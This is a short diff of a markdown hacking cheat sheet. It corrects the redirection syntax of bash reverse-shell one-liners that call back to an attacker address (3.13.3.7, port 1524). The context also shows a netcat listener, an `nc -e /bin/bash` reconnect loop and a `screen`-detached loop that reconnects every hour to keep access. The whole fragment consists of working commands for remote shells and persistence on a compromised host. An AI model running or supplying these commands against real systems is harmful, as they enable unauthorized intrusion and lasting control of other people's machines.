@@ -329,7 +329,7 @@ $ nc -nvlp 1524
 
 On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
 ```
-$ bash -i 2>&1 >&/dev/tcp/3.13.3.7/1524 0>&1
+$ bash -i &>/dev/tcp/3.13.3.7/1524 0>&1
 ```
 
 <a id="rswob-anchor"></a>
@@ -450,7 +450,7 @@ $ (while :; do nc -e /bin/bash -vn 3.13.3.7 1524; sleep 3600; done ) &>/dev/null
 
 Or
 ```
-$ screen -d -m /bin/bash -c 'while :; do bash -i 2>&1 >&/dev/tcp/3.13.3.7/1524 0>&1; sleep 3600; done'
+$ screen -d -m /bin/bash -c 'while :; do bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 3600; done'
 ```
 
 <a id="bdak-anchor"></a>
